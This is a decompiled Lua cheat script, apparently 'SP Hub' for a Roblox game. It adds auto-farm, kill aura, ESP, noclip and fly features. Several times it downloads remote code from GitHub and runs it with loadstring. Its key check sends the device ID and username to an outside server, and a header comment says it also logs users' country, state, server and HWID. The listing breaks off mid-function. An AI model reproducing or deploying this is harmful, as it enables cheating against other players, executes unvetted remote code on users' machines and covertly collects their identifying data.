--key system removed
-- has logger that logs : username, userId, country, state, game, server, placeId, time, execution, executor, script, device, hwid

local CoreGui = game:GetService('CoreGui')
local HttpService = game:GetService('HttpService')
local LocalizationService = game:GetService('LocalizationService')
local MarketplaceService = game:GetService('MarketplaceService')
local PlayerService = game:GetService('Players')
local RbxAnalyticsService = game:GetService('RbxAnalyticsService')
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local RunService = game:GetService('RunService')
local StarterGui = game:GetService('StarterGui')
local TeleportService = game:GetService('TeleportService')
local TweenService = game:GetService('TweenService')
local UserInputService = game:GetService('UserInputService')
local Workspace_2 = game:GetService('Workspace')
local countArguments = select
local pack = function(...)
    return {
        n = countArguments("#", ...),
        ...,
    }
end
local unpack = table.unpack or unpack
local concatenate = table.concat
local runRecoveredSource = function(...)
    local tbl = {
        ...,
    }
    local value_2 = #tbl - 0
    if value_2 < 0 then
        value_2 = 0
    end
    local tbl_2 = {}
    for argument_index = 1, value_2 do
        tbl_2[argument_index] = tbl[0 + argument_index]
    end
    local players, replicated_storage, run_service, val, workspace_2, tween_service, http_service, game_2, local_player, handler, tbl_3, spawn_2, handler_2, handler_3, pcall_2, handler_4, handler_5, handler_6, tbl_4, handler_7, handler_8, tbl_5, slime, handler_9, tbl_6, handler_10, handler_11, make_window, handler_12, make_tab, make_tab_2, tbl_7, handler_result, info, handler_13, handler_14, handler_result_2, handler_result_3, connect, show_aura, spawn_3, handler_15, add_toggle, handler_16, fpsboost, val_2
    local tbl_8 = {}
    local sphub_first_time_path = "SPHub_FirstTime.txt"
    tbl_8.value = getgenv
    tbl_8.value = tbl_8.value()
    if tbl_8.value then
        tbl_8.value.SPHubIsFirstTime = false
    end
    tbl_8.value = pcall
    local val_3 = sphub_first_time_path
    local handler_18 = function()
        local local_1_result = isfile
        local handler_17 = val_3
        local_1_result = local_1_result(handler_17)
        if not local_1_result then
            local_1_result = getgenv()
            local_1_result.SPHubIsFirstTime = true
            writefile(val_3, "played")
            local_1_result = task.spawn
            handler_17 = function()
                (task.wait)(1.0)
                local starter_gui = StarterGui
                local val_4 = starter_gui
                if starter_gui then
                    starter_gui = starter_gui.SetCore
                else
                    starter_gui = nil
                end
                starter_gui(val_4, "SendNotification", {
                    Title = "SP Hub",
                    Text = "First time using SP Hub! Enjoy the script without ads.",
                    Duration = 7.0,
                })
                return
            end
            local_1_result(handler_17)
        end
        return
    end
    tbl_8.value(handler_18)
    tbl_8.value = getgenv
    tbl_8.value = tbl_8.value()
    if tbl_8.value ~= nil then
        tbl_8.value = tbl_8.value.SPHubIsFirstTime
    else
        tbl_8.value = nil
    end
    if not tbl_8.value then
        tbl_8.value = pcall
        handler_18 = function()
            local pack_result
            local chunk = loadstring
            local game_3 = game
            local pack_result_2 = game_3
            game_3 = game_3.HttpGet
            local pack_result_3 = pack(game_3(pack_result_2, "https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/DiscordADgui"))
            if pack_result_3.n >= 1 then
                game_3 = pack_result_3[1]
            end
            if pack_result_3.n >= 2 then
                pack_result_2 = pack_result_3[2]
            end
            if pack_result_3.n >= 3 then
                pack_result = pack_result_3[3]
            end
            chunk = chunk(unpack(pack_result_3, 1, pack_result_3.n))
            chunk()
            while true do
                (task.wait)(1.0)
                chunk = CoreGui
                game_3 = chunk
                if chunk then
                    chunk = chunk.FindFirstChild
                else
                    chunk = nil
                end
                pack_result_2 = "DiscordAdUI"
                chunk = chunk(game_3, pack_result_2)
                if not chunk then
                    break
                end
            end
            return
        end
        tbl_8.value(handler_18)
    end
    tbl_8 = {
        value = tbl_8.value,
    }
    local tbl_9 = {}
    local tbl_10 = {}
    local tbl_11 = {}
    local tbl_12 = {}
    local tbl_13 = {}
    local tbl_14 = {}
    local tbl_15 = {}
    local tbl_16 = {}
    local tbl_17 = {}
    local tbl_18 = {}
    local tbl_19 = {}
    local tbl_20 = {}
    local tbl_21 = {}
    local tbl_22 = {}
    local tbl_23 = {}
    local tbl_24 = {}
    local tbl_25 = {}
    local tbl_26 = {}
    local tbl_27 = {}
    local tbl_28 = {}
    local tbl_29 = {}
    local tbl_30 = {}
    local tbl_31 = {}
    local tbl_32 = {}
    local tbl_33 = {}
    local tbl_34 = {}
    local tbl_35 = {}
    local tbl_36 = {}
    sphub_first_time_path = loadstring
    tbl_8.value = game
    handler_18 = tbl_8.value
    if tbl_8.value then
        tbl_8.value = tbl_8.value.HttpGet
    else
        tbl_8.value = nil
    end
    local pack_result_4 = pack(tbl_8.value(handler_18, "https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/splibv2"))
    if pack_result_4.n >= 1 then
        tbl_8.value = pack_result_4[1]
    end
    if pack_result_4.n >= 2 then
        handler_18 = pack_result_4[2]
    end
    if pack_result_4.n >= 3 then
        players = pack_result_4[3]
    end
    if pack_result_4.n >= 4 then
        replicated_storage = pack_result_4[4]
    end
    if pack_result_4.n >= 5 then
        run_service = pack_result_4[5]
    end
    if pack_result_4.n >= 6 then
        val = pack_result_4[6]
    end
    if pack_result_4.n >= 7 then
        workspace_2 = pack_result_4[7]
    end
    if pack_result_4.n >= 8 then
        tween_service = pack_result_4[8]
    end
    if pack_result_4.n >= 9 then
        http_service = pack_result_4[9]
    end
    if pack_result_4.n >= 10 then
        game_2 = pack_result_4[10]
    end
    if pack_result_4.n >= 11 then
        local_player = pack_result_4[11]
    end
    if pack_result_4.n >= 12 then
        handler = pack_result_4[12]
    end
    if pack_result_4.n >= 13 then
        tbl_3 = pack_result_4[13]
    end
    if pack_result_4.n >= 14 then
        tbl_9.value = pack_result_4[14]
    end
    if pack_result_4.n >= 15 then
        tbl_10.value = pack_result_4[15]
    end
    if pack_result_4.n >= 16 then
        tbl_11.value = pack_result_4[16]
    end
    if pack_result_4.n >= 17 then
        tbl_12.value = pack_result_4[17]
    end
    if pack_result_4.n >= 18 then
        tbl_13.value = pack_result_4[18]
    end
    if pack_result_4.n >= 19 then
        tbl_14.value = pack_result_4[19]
    end
    if pack_result_4.n >= 20 then
        tbl_15.value = pack_result_4[20]
    end
    if pack_result_4.n >= 21 then
        spawn_2 = pack_result_4[21]
    end
    if pack_result_4.n >= 22 then
        handler_2 = pack_result_4[22]
    end
    if pack_result_4.n >= 23 then
        handler_3 = pack_result_4[23]
    end
    if pack_result_4.n >= 24 then
        pcall_2 = pack_result_4[24]
    end
    if pack_result_4.n >= 25 then
        handler_4 = pack_result_4[25]
    end
    if pack_result_4.n >= 26 then
        handler_5 = pack_result_4[26]
    end
    if pack_result_4.n >= 27 then
        tbl_16.value = pack_result_4[27]
    end
    if pack_result_4.n >= 28 then
        handler_6 = pack_result_4[28]
    end
    if pack_result_4.n >= 29 then
        tbl_4 = pack_result_4[29]
    end
    if pack_result_4.n >= 30 then
        tbl_17.value = pack_result_4[30]
    end
    if pack_result_4.n >= 31 then
        handler_7 = pack_result_4[31]
    end
    if pack_result_4.n >= 32 then
        handler_8 = pack_result_4[32]
    end
    if pack_result_4.n >= 33 then
        tbl_5 = pack_result_4[33]
    end
    if pack_result_4.n >= 34 then
        slime = pack_result_4[34]
    end
    if pack_result_4.n >= 35 then
        tbl_18.value = pack_result_4[35]
    end
    if pack_result_4.n >= 36 then
        handler_9 = pack_result_4[36]
    end
    if pack_result_4.n >= 37 then
        tbl_6 = pack_result_4[37]
    end
    if pack_result_4.n >= 38 then
        tbl_19.value = pack_result_4[38]
    end
    if pack_result_4.n >= 39 then
        tbl_20.value = pack_result_4[39]
    end
    if pack_result_4.n >= 40 then
        handler_10 = pack_result_4[40]
    end
    if pack_result_4.n >= 41 then
        handler_11 = pack_result_4[41]
    end
    if pack_result_4.n >= 42 then
        make_window = pack_result_4[42]
    end
    if pack_result_4.n >= 43 then
        handler_12 = pack_result_4[43]
    end
    if pack_result_4.n >= 44 then
        tbl_21.value = pack_result_4[44]
    end
    if pack_result_4.n >= 45 then
        tbl_22.value = pack_result_4[45]
    end
    if pack_result_4.n >= 46 then
        tbl_23.value = pack_result_4[46]
    end
    if pack_result_4.n >= 47 then
        tbl_24.value = pack_result_4[47]
    end
    if pack_result_4.n >= 48 then
        tbl_25.value = pack_result_4[48]
    end
    if pack_result_4.n >= 49 then
        make_tab = pack_result_4[49]
    end
    if pack_result_4.n >= 50 then
        make_tab_2 = pack_result_4[50]
    end
    if pack_result_4.n >= 51 then
        tbl_7 = pack_result_4[51]
    end
    if pack_result_4.n >= 52 then
        handler_result = pack_result_4[52]
    end
    if pack_result_4.n >= 53 then
        info = pack_result_4[53]
    end
    if pack_result_4.n >= 54 then
        tbl_26.value = pack_result_4[54]
    end
    if pack_result_4.n >= 55 then
        tbl_27.value = pack_result_4[55]
    end
    if pack_result_4.n >= 56 then
        tbl_28.value = pack_result_4[56]
    end
    if pack_result_4.n >= 57 then
        tbl_29.value = pack_result_4[57]
    end
    if pack_result_4.n >= 58 then
        tbl_30.value = pack_result_4[58]
    end
    if pack_result_4.n >= 59 then
        tbl_31.value = pack_result_4[59]
    end
    if pack_result_4.n >= 60 then
        tbl_32.value = pack_result_4[60]
    end
    if pack_result_4.n >= 61 then
        tbl_33.value = pack_result_4[61]
    end
    if pack_result_4.n >= 62 then
        tbl_34.value = pack_result_4[62]
    end
    if pack_result_4.n >= 63 then
        handler_13 = pack_result_4[63]
    end
    if pack_result_4.n >= 64 then
        tbl_35.value = pack_result_4[64]
    end
    if pack_result_4.n >= 65 then
        handler_14 = pack_result_4[65]
    end
    if pack_result_4.n >= 66 then
        tbl_36.value = pack_result_4[66]
    end
    if pack_result_4.n >= 67 then
        handler_result_2 = pack_result_4[67]
    end
    if pack_result_4.n >= 68 then
        handler_result_3 = pack_result_4[68]
    end
    if pack_result_4.n >= 69 then
        connect = pack_result_4[69]
    end
    if pack_result_4.n >= 70 then
        show_aura = pack_result_4[70]
    end
    if pack_result_4.n >= 71 then
        spawn_3 = pack_result_4[71]
    end
    if pack_result_4.n >= 72 then
        handler_15 = pack_result_4[72]
    end
    if pack_result_4.n >= 73 then
        add_toggle = pack_result_4[73]
    end
    if pack_result_4.n >= 74 then
        handler_16 = pack_result_4[74]
    end
    if pack_result_4.n >= 75 then
        fpsboost = pack_result_4[75]
    end
    if pack_result_4.n >= 76 then
        val_2 = pack_result_4[76]
    end
    sphub_first_time_path = (sphub_first_time_path(unpack(pack_result_4, 1, pack_result_4.n)))()
    tbl_8.value = "en"
    handler_18 = loadstring
    pack_result_4 = pack(game:HttpGet("https://raw.githubusercontent.com/as6cd0/ScriptsMoudle/main/PixelBlade-Translate.lua"))
    if pack_result_4.n >= 1 then
        players = pack_result_4[1]
    end
    if pack_result_4.n >= 2 then
        replicated_storage = pack_result_4[2]
    end
    if pack_result_4.n >= 3 then
        run_service = pack_result_4[3]
    end
    if pack_result_4.n >= 4 then
        val = pack_result_4[4]
    end
    if pack_result_4.n >= 5 then
        workspace_2 = pack_result_4[5]
    end
    if pack_result_4.n >= 6 then
        tween_service = pack_result_4[6]
    end
    if pack_result_4.n >= 7 then
        http_service = pack_result_4[7]
    end
    if pack_result_4.n >= 8 then
        game_2 = pack_result_4[8]
    end
    if pack_result_4.n >= 9 then
        local_player = pack_result_4[9]
    end
    if pack_result_4.n >= 10 then
        handler = pack_result_4[10]
    end
    if pack_result_4.n >= 11 then
        tbl_3 = pack_result_4[11]
    end
    if pack_result_4.n >= 12 then
        tbl_9.value = pack_result_4[12]
    end
    if pack_result_4.n >= 13 then
        tbl_10.value = pack_result_4[13]
    end
    if pack_result_4.n >= 14 then
        tbl_11.value = pack_result_4[14]
    end
    if pack_result_4.n >= 15 then
        tbl_12.value = pack_result_4[15]
    end
    if pack_result_4.n >= 16 then
        tbl_13.value = pack_result_4[16]
    end
    if pack_result_4.n >= 17 then
        tbl_14.value = pack_result_4[17]
    end
    if pack_result_4.n >= 18 then
        tbl_15.value = pack_result_4[18]
    end
    if pack_result_4.n >= 19 then
        spawn_2 = pack_result_4[19]
    end
    if pack_result_4.n >= 20 then
        handler_2 = pack_result_4[20]
    end
    if pack_result_4.n >= 21 then
        handler_3 = pack_result_4[21]
    end
    if pack_result_4.n >= 22 then
        pcall_2 = pack_result_4[22]
    end
    if pack_result_4.n >= 23 then
        handler_4 = pack_result_4[23]
    end
    if pack_result_4.n >= 24 then
        handler_5 = pack_result_4[24]
    end
    if pack_result_4.n >= 25 then
        tbl_16.value = pack_result_4[25]
    end
    if pack_result_4.n >= 26 then
        handler_6 = pack_result_4[26]
    end
    if pack_result_4.n >= 27 then
        tbl_4 = pack_result_4[27]
    end
    if pack_result_4.n >= 28 then
        tbl_17.value = pack_result_4[28]
    end
    if pack_result_4.n >= 29 then
        handler_7 = pack_result_4[29]
    end
    if pack_result_4.n >= 30 then
        handler_8 = pack_result_4[30]
    end
    if pack_result_4.n >= 31 then
        tbl_5 = pack_result_4[31]
    end
    if pack_result_4.n >= 32 then
        slime = pack_result_4[32]
    end
    if pack_result_4.n >= 33 then
        tbl_18.value = pack_result_4[33]
    end
    if pack_result_4.n >= 34 then
        handler_9 = pack_result_4[34]
    end
    if pack_result_4.n >= 35 then
        tbl_6 = pack_result_4[35]
    end
    if pack_result_4.n >= 36 then
        tbl_19.value = pack_result_4[36]
    end
    if pack_result_4.n >= 37 then
        tbl_20.value = pack_result_4[37]
    end
    if pack_result_4.n >= 38 then
        handler_10 = pack_result_4[38]
    end
    if pack_result_4.n >= 39 then
        handler_11 = pack_result_4[39]
    end
    if pack_result_4.n >= 40 then
        make_window = pack_result_4[40]
    end
    if pack_result_4.n >= 41 then
        handler_12 = pack_result_4[41]
    end
    if pack_result_4.n >= 42 then
        tbl_21.value = pack_result_4[42]
    end
    if pack_result_4.n >= 43 then
        tbl_22.value = pack_result_4[43]
    end
    if pack_result_4.n >= 44 then
        tbl_23.value = pack_result_4[44]
    end
    if pack_result_4.n >= 45 then
        tbl_24.value = pack_result_4[45]
    end
    if pack_result_4.n >= 46 then
        tbl_25.value = pack_result_4[46]
    end
    if pack_result_4.n >= 47 then
        make_tab = pack_result_4[47]
    end
    if pack_result_4.n >= 48 then
        make_tab_2 = pack_result_4[48]
    end
    if pack_result_4.n >= 49 then
        tbl_7 = pack_result_4[49]
    end
    if pack_result_4.n >= 50 then
        handler_result = pack_result_4[50]
    end
    if pack_result_4.n >= 51 then
        info = pack_result_4[51]
    end
    if pack_result_4.n >= 52 then
        tbl_26.value = pack_result_4[52]
    end
    if pack_result_4.n >= 53 then
        tbl_27.value = pack_result_4[53]
    end
    if pack_result_4.n >= 54 then
        tbl_28.value = pack_result_4[54]
    end
    if pack_result_4.n >= 55 then
        tbl_29.value = pack_result_4[55]
    end
    if pack_result_4.n >= 56 then
        tbl_30.value = pack_result_4[56]
    end
    if pack_result_4.n >= 57 then
        tbl_31.value = pack_result_4[57]
    end
    if pack_result_4.n >= 58 then
        tbl_32.value = pack_result_4[58]
    end
    if pack_result_4.n >= 59 then
        tbl_33.value = pack_result_4[59]
    end
    if pack_result_4.n >= 60 then
        tbl_34.value = pack_result_4[60]
    end
    if pack_result_4.n >= 61 then
        handler_13 = pack_result_4[61]
    end
    if pack_result_4.n >= 62 then
        tbl_35.value = pack_result_4[62]
    end
    if pack_result_4.n >= 63 then
        handler_14 = pack_result_4[63]
    end
    if pack_result_4.n >= 64 then
        tbl_36.value = pack_result_4[64]
    end
    if pack_result_4.n >= 65 then
        handler_result_2 = pack_result_4[65]
    end
    if pack_result_4.n >= 66 then
        handler_result_3 = pack_result_4[66]
    end
    if pack_result_4.n >= 67 then
        connect = pack_result_4[67]
    end
    if pack_result_4.n >= 68 then
        show_aura = pack_result_4[68]
    end
    if pack_result_4.n >= 69 then
        spawn_3 = pack_result_4[69]
    end
    if pack_result_4.n >= 70 then
        handler_15 = pack_result_4[70]
    end
    if pack_result_4.n >= 71 then
        add_toggle = pack_result_4[71]
    end
    if pack_result_4.n >= 72 then
        handler_16 = pack_result_4[72]
    end
    if pack_result_4.n >= 73 then
        fpsboost = pack_result_4[73]
    end
    if pack_result_4.n >= 74 then
        val_2 = pack_result_4[74]
    end
    handler_18 = (handler_18(unpack(pack_result_4, 1, pack_result_4.n)))()
    players = PlayerService
    replicated_storage = ReplicatedStorage
    run_service = RunService
    game:GetService("UserInputService")
    workspace_2 = Workspace_2
    tween_service = TweenService
    http_service = HttpService
    game:GetService("RbxAnalyticsService")
    game_2 = game
    local_player = game_2
    game_2 = (game_2.GetService)(local_player, "Lighting")
    if players ~= nil then
        local_player = players.LocalPlayer
    else
        local_player = nil
    end
    handler = _G
    handler.SP_Hub_TKeys = {}
    handler = _G
    local val_5, capture_1_18946_2 = handler_18, tbl_8
    handler.SP_Hub_Translator = function(argument_1)
        local local_2_result
        local text = tostring
        if argument_1 then
            local_2_result = argument_1
        else
            local_2_result = ""
        end
        argument_1 = (text(local_2_result))
        text = val_5
        if text ~= nil then
            text = text[argument_1]
        else
            text = nil
        end
        if text then
            text = val_5
            if text ~= nil then
                text = text[argument_1]
            else
                text = nil
            end
            local_2_result = capture_1_18946_2.value
            if text ~= nil then
                text = text[local_2_result]
            else
                text = nil
            end
            if not text then
                text = argument_1
            end
        else
            text = argument_1
        end
        return text
    end
    handler = function(argument_1)
        local local_2_result_2
        local text_2 = tostring
        if argument_1 then
            local_2_result_2 = argument_1
        else
            local_2_result_2 = ""
        end
        argument_1 = (text_2(local_2_result_2))
        text_2 = (_G.SP_Hub_Translator)(argument_1)
        local_2_result_2 = _G.SP_Hub_TKeys
        local text_3 = tostring(text_2)
        if local_2_result_2 then
            local_2_result_2[text_3] = argument_1
        end
        local_2_result_2 = _G.SP_Hub_TKeys
        if local_2_result_2 then
            local_2_result_2[argument_1] = argument_1
        end
        return text_2
    end
    tbl_9.value = function(argument_1, argument_2, argument_3)
        local starter_gui_2 = StarterGui
        local val_6 = starter_gui_2
        if starter_gui_2 then
            starter_gui_2 = starter_gui_2.SetCore
        else
            starter_gui_2 = nil
        end
        starter_gui_2(val_6, "SendNotification", {
            Title = argument_1,
            Text = argument_2,
            Duration = argument_3,
        })
        return
    end
    tbl_10.value = "SP Hub"
    tbl_11.value = "This will take some sec for loading"
    tbl_12.value = 6.0
    tbl_9.value(tbl_10.value, tbl_11.value, tbl_12.value)
    tbl_3 = {}
    tbl_3.CurrentLanguage = "en"
    tbl_3.AutoFarm = false
    tbl_3.AutoUpgradeSkills = false
    tbl_3.AutoUpgradeSwords = false
    tbl_3.AutoUpgradeArmors = false
    tbl_3.Aura = false
    tbl_3.AuraRadius = 100.0
    tbl_3.ESP = false
    tbl_3.NoClip = false
    tbl_3.InfDashForce = false
    tbl_3.Speed = false
    tbl_3.SpeedValue = 21.0
    tbl_3.Fly = false
    tbl_3.FlySpeed = 40.0
    tbl_3.AutoFish = false
    tbl_3.FishSpeed = 1.0
    tbl_9.value = nil
    tbl_10.value = nil
    tbl_11.value = nil
    tbl_12.value = task
    if tbl_12.value ~= nil then
        tbl_12.value = tbl_12.value.spawn
    else
        tbl_12.value = nil
    end
    local val_7, val_8, val_9, val_10 = tbl_9, local_player, tbl_10, tbl_11
    tbl_13.value = function()
        local pcall_3
        while true do
            pcall_3 = pcall
            local capture_8_513_2, val_11, capture_8_515_2, capture_8_516_2 = val_7, val_8, val_9, val_10
            pcall_3(function()
                local val_12, humanoid_root_part, value_3
                local character = val_11
                if character ~= nil then
                    character = character.Character
                else
                    character = nil
                end
                capture_8_513_2.value = character
                character = capture_8_513_2.value
                if character then
                    character = capture_8_513_2.value
                    val_12 = character
                    if character then
                        character = character.WaitForChild
                    else
                        character = nil
                    end
                    humanoid_root_part = "HumanoidRootPart"
                    value_3 = 2.0
                    character = character(val_12, humanoid_root_part, value_3)
                end
                capture_8_515_2.value = character
                character = capture_8_513_2.value
                if character then
                    character = capture_8_513_2.value
                    val_12 = character
                    if character then
                        character = character.WaitForChild
                    else
                        character = nil
                    end
                    humanoid_root_part = "Humanoid"
                    value_3 = 2.0
                    character = character(val_12, humanoid_root_part, value_3)
                end
                capture_8_516_2.value = character
                return
            end)
            pcall_3 = task.wait
            pcall_3(1.0)
        end
    end
    tbl_12.value(tbl_13.value)
    tbl_12.value = nil
    tbl_13.value = nil
    tbl_14.value = nil
    tbl_15.value = nil
    spawn_2 = task.spawn
    local val_13, capture_1_29186_2, capture_1_29187_2, capture_1_29188_2, capture_1_29189_2 = replicated_storage, tbl_12, tbl_13, tbl_14, tbl_15
    spawn_2(function()
        local find_first_child, find_first_child_2, remotes_2
        while true do
            (task.wait)(1.0)
            find_first_child = val_13
            find_first_child_2 = find_first_child
            if find_first_child then
                find_first_child = find_first_child.FindFirstChild
            else
                find_first_child = nil
            end
            remotes_2 = "remotes"
            find_first_child = find_first_child(find_first_child_2, remotes_2)
            if find_first_child then
                remotes_2 = find_first_child
                if find_first_child then
                    find_first_child_2 = find_first_child.FindFirstChild
                else
                    find_first_child_2 = nil
                end
                find_first_child_2 = find_first_child_2(remotes_2, "swing")
                capture_1_29186_2.value = find_first_child_2
                remotes_2 = find_first_child
                if find_first_child then
                    find_first_child_2 = find_first_child.FindFirstChild
                else
                    find_first_child_2 = nil
                end
                find_first_child_2 = find_first_child_2(remotes_2, "onHit")
                capture_1_29187_2.value = find_first_child_2
                remotes_2 = find_first_child
                if find_first_child then
                    find_first_child_2 = find_first_child.FindFirstChild
                else
                    find_first_child_2 = nil
                end
                find_first_child_2 = find_first_child_2(remotes_2, "block")
                capture_1_29188_2.value = find_first_child_2
                remotes_2 = find_first_child
                if find_first_child then
                    find_first_child_2 = find_first_child.FindFirstChild
                else
                    find_first_child_2 = nil
                end
                capture_1_29189_2.value = find_first_child_2(remotes_2, "fishCaught")
                find_first_child_2 = capture_1_29186_2.value
                if find_first_child_2 then
                    find_first_child_2 = capture_1_29187_2.value
                    if find_first_child_2 then
                        find_first_child_2 = capture_1_29188_2.value
                        if find_first_child_2 then
                            break
                        end
                    end
                end
            end
        end
        return
    end)
    spawn_2 = {
        API_URL = "https://sphub.lol/api/check",
        GET_KEY_URL = "https://sphub.lol/get-key",
        KEY_FILE = "sphub_key.txt",
        savedKey = "",
    }
    handler_2 = function()
        local type_name = type
        local request_2 = request
        type_name = type_name(request_2)
        if (type_name == "function") then
            type_name = request
            return type_name
        else
            type_name = type
            request_2 = http_request
            type_name = type_name(request_2)
            if (type_name == "function") then
                type_name = http_request
                return type_name
            else
                type_name = type
                request_2 = syn
                type_name = type_name(request_2)
                if (type_name == "table") then
                    type_name = type
                    request_2 = syn
                    if request_2 ~= nil then
                        request_2 = request_2.request
                    else
                        request_2 = nil
                    end
                    type_name = type_name(request_2)
                    if (type_name == "function") then
                        type_name = syn
                        if type_name ~= nil then
                            type_name = type_name.request
                        else
                            type_name = nil
                        end
                        return type_name
                    else
                        type_name = type
                        request_2 = http
                        type_name = type_name(request_2)
                        if (type_name == "table") then
                            type_name = type
                            request_2 = http
                            if request_2 ~= nil then
                                request_2 = request_2.request
                            else
                                request_2 = nil
                            end
                            type_name = type_name(request_2)
                            if (type_name == "function") then
                                type_name = http
                                if type_name ~= nil then
                                    type_name = type_name.request
                                else
                                    type_name = nil
                                end
                                return type_name
                            else
                                type_name = type
                                request_2 = fluxus
                                type_name = type_name(request_2)
                                if (type_name == "table") then
                                    type_name = type
                                    request_2 = fluxus
                                    if request_2 ~= nil then
                                        request_2 = request_2.request
                                    else
                                        request_2 = nil
                                    end
                                    type_name = type_name(request_2)
                                    if (type_name == "function") then
                                        type_name = fluxus
                                        if type_name ~= nil then
                                            type_name = type_name.request
                                        else
                                            type_name = nil
                                        end
                                        return type_name
                                    else
                                        type_name = nil
                                        return type_name
                                    end
                                else
                                    type_name = nil
                                    return type_name
                                end
                            end
                        else
                            type_name = type
                            request_2 = fluxus
                            type_name = type_name(request_2)
                            if (type_name == "table") then
                                type_name = type
                                request_2 = fluxus
                                if request_2 ~= nil then
                                    request_2 = request_2.request
                                else
                                    request_2 = nil
                                end
                                type_name = type_name(request_2)
                                if (type_name == "function") then
                                    type_name = fluxus
                                    if type_name ~= nil then
                                        type_name = type_name.request
                                    else
                                        type_name = nil
                                    end
                                    return type_name
                                else
                                    type_name = nil
                                    return type_name
                                end
                            else
                                type_name = nil
                                return type_name
                            end
                        end
                    end
                else
                    type_name = type
                    request_2 = http
                    type_name = type_name(request_2)
                    if (type_name == "table") then
                        type_name = type
                        request_2 = http
                        if request_2 ~= nil then
                            request_2 = request_2.request
                        else
                            request_2 = nil
                        end
                        type_name = type_name(request_2)
                        if (type_name == "function") then
                            type_name = http
                            if type_name ~= nil then
                                type_name = type_name.request
                            else
                                type_name = nil
                            end
                            return type_name
                        else
                            type_name = type
                            request_2 = fluxus
                            type_name = type_name(request_2)
                            if (type_name == "table") then
                                type_name = type
                                request_2 = fluxus
                                if request_2 ~= nil then
                                    request_2 = request_2.request
                                else
                                    request_2 = nil
                                end
                                type_name = type_name(request_2)
                                if (type_name == "function") then
                                    type_name = fluxus
                                    if type_name ~= nil then
                                        type_name = type_name.request
                                    else
                                        type_name = nil
                                    end
                                    return type_name
                                else
                                    type_name = nil
                                    return type_name
                                end
                            else
                                type_name = nil
                                return type_name
                            end
                        end
                    else
                        type_name = type
                        request_2 = fluxus
                        type_name = type_name(request_2)
                        if (type_name == "table") then
                            type_name = type
                            request_2 = fluxus
                            if request_2 ~= nil then
                                request_2 = request_2.request
                            else
                                request_2 = nil
                            end
                            type_name = type_name(request_2)
                            if (type_name == "function") then
                                type_name = fluxus
                                if type_name ~= nil then
                                    type_name = type_name.request
                                else
                                    type_name = nil
                                end
                                return type_name
                            else
                                type_name = nil
                                return type_name
                            end
                        else
                            type_name = nil
                            return type_name
                        end
                    end
                end
            end
        end
    end
    local val_14, val_15, val_16, val_17 = local_player, handler_2, spawn_2, http_service
    handler_3 = function(argument_1)
        local pack_result_5
        local tbl_37, rbx_analytics_service, body_2, connection_error, failed_to_contact_verification_server, server_returned_empty_response, decode_error, failed_to_parse_api_response, expires_2
        local text_4 = tostring
        if argument_1 then
            tbl_37 = argument_1
        else
            tbl_37 = ""
        end
        text_4 = text_4(tbl_37)
        tbl_37 = text_4
        if text_4 then
            text_4 = text_4.gsub
        else
            text_4 = nil
        end
        local no_key = "%s+"
        local please_enter_a_key = ""
        text_4 = text_4(tbl_37, no_key, please_enter_a_key)
        if (text_4 == "") then
            tbl_37 = false
            no_key = "No Key"
            please_enter_a_key = "Please enter a key"
            return tbl_37, no_key, please_enter_a_key
        else
            tbl_37 = {
                key = text_4,
            }
            no_key = game
            please_enter_a_key = no_key
            no_key = no_key.GetService
            rbx_analytics_service = "RbxAnalyticsService"
            no_key = no_key(please_enter_a_key, rbx_analytics_service)
            please_enter_a_key = no_key
            if no_key then
                no_key = no_key.GetClientId
            else
                no_key = nil
            end
            tbl_37.hwid = no_key(please_enter_a_key)
            no_key = val_14
            if no_key then
                no_key = val_14
                if no_key ~= nil then
                    no_key = no_key.Name
                else
                    no_key = nil
                end
                if not no_key then
                    no_key = ""
                end
            else
                no_key = ""
            end
            tbl_37.user_id = no_key
            no_key = val_15()
            if not no_key then
                please_enter_a_key = false
                rbx_analytics_service = "Executor Error"
                body_2 = "Your executor does not support HTTP requests"
                return please_enter_a_key, rbx_analytics_service, body_2
            else
                please_enter_a_key = pcall
                local val_18, val_19, val_20, val_21 = no_key, val_16, val_17, tbl_37
                rbx_analytics_service = function()
                    local val_22 = val_18
                    local tbl_38 = {}
                    local api_url = val_19
                    if api_url ~= nil then
                        api_url = api_url.API_URL
                    else
                        api_url = nil
                    end
                    tbl_38.Url = api_url
                    tbl_38.Method = "POST"
                    api_url = {}
                    api_url["Content-Type"] = "application/json"
                    tbl_38.Headers = api_url
                    api_url = val_20
                    local val_23 = api_url
                    if api_url then
                        api_url = api_url.JSONEncode
                    else
                        api_url = nil
                    end
                    tbl_38.Body = api_url(val_23, val_21)
                    return val_22(tbl_38)
                end
                please_enter_a_key = please_enter_a_key(rbx_analytics_service)
                if please_enter_a_key then
                    if not rbx_analytics_service then
                        body_2 = false
                        connection_error = "Connection Error"
                        failed_to_contact_verification_server = "Failed to contact verification server"
                        return body_2, connection_error, failed_to_contact_verification_server
                    else
                        if rbx_analytics_service ~= nil then
                            body_2 = rbx_analytics_service.Body
                        else
                            body_2 = nil
                        end
                        if not body_2 then
                            if rbx_analytics_service ~= nil then
                                body_2 = rbx_analytics_service.body
                            else
                                body_2 = nil
                            end
                        end
                        if body_2 then
                            if (body_2 == "") then
                                connection_error = false
                                failed_to_contact_verification_server = "Empty Response"
                                server_returned_empty_response = "Server returned empty response"
                                return connection_error, failed_to_contact_verification_server, server_returned_empty_response
                            else
                                connection_error = pcall
                                local val_24, val_25 = val_17, body_2
                                failed_to_contact_verification_server = function()
                                    local jsondecode = val_24
                                    local val_26 = jsondecode
                                    if jsondecode then
                                        jsondecode = jsondecode.JSONDecode
                                    else
                                        jsondecode = nil
                                    end
                                    return jsondecode(val_26, val_25)
                                end
                                connection_error = connection_error(failed_to_contact_verification_server)
                                if connection_error then
                                    if failed_to_contact_verification_server then
                                        server_returned_empty_response = type
                                        decode_error = failed_to_contact_verification_server
                                        server_returned_empty_response = server_returned_empty_response(decode_error)
                                        if server_returned_empty_response ~= "table" then
                                            server_returned_empty_response = false
                                            decode_error = "Decode Error"
                                            failed_to_parse_api_response = "Failed to parse API response"
                                            return server_returned_empty_response, decode_error, failed_to_parse_api_response
                                        else
                                            if failed_to_contact_verification_server ~= nil then
                                                server_returned_empty_response = failed_to_contact_verification_server.valid
                                            else
                                                server_returned_empty_response = nil
                                            end
                                            if server_returned_empty_response then
                                                if failed_to_contact_verification_server ~= nil then
                                                    server_returned_empty_response = failed_to_contact_verification_server.expires_formatted
                                                else
                                                    server_returned_empty_response = nil
                                                end
                                                if not server_returned_empty_response then
